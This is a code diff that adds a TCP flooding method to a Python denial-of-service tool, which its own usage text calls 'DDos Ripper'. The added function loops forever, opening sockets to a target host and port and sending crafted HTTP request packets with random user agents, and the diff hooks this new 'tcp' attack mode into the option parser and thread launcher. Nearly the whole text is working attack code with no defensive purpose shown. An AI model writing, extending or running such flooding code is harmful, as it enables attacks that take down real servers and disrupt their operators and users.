@@ -105,6 +105,28 @@ def down_it_http():
         time.sleep(.01)
 
 
+def down_it_tcp():
+    while True:
+        try:
+            packet = str(
+                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
+                'utf-8')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, int(port)))
+            if s.sendto(packet, (host, int(port))):
+                s.shutdown(1)
+                print('\033[92m TCP Packet was sent \033[0;0m')
+            else:
+                s.shutdown(1)
+                print("\033[91mshut<->down\033[0m")
+            time.sleep(.1)
+        except Exception as e:
+            print("\033[91mError: " + e + ".\033[0m")
+            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
+                  " Program will continue working.\033[0m")
+            time.sleep(.1)
+
+
 def usage():
     print(''' \033[0;95mDDos Ripper 
 
@@ -115,7 +137,7 @@ def usage():
 	-s : -server ip
 	-p : -port default 80
 	-t : -threads default 100
-	-m : -method default udp (udp/http)
+	-m : -method default udp (udp/tcp/http)
     --resource : -api-host under attack\033[0m ''')
     sys.exit()
 
@@ -137,7 +159,7 @@ def get_parameters():
     optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                     help="Send random packets with random length")
     optp.add_option("-m", "--method", type="str", dest="attack_method",
-                    help="Attack method: udp (default), http")
+                    help="Attack method: udp (default), tcp, http")
     optp.add_option('--resource', type='str', dest='resource', help='It shows the resource under attack.', default=True)
     opts, args = optp.parse_args()
     if opts.help:
@@ -215,6 +237,9 @@ if __name__ == '__main__':
         elif attack_method == 'http':
             set_headers_dict()
             thrs.append(threading.Thread(target=down_it_http))
+        elif attack_method == 'tcp':
+            set_headers_dict()
+            thrs.append(threading.Thread(target=down_it_tcp))
         thrs[i].daemon = True  # if thread is exist, it dies
         thrs[i].start()
 
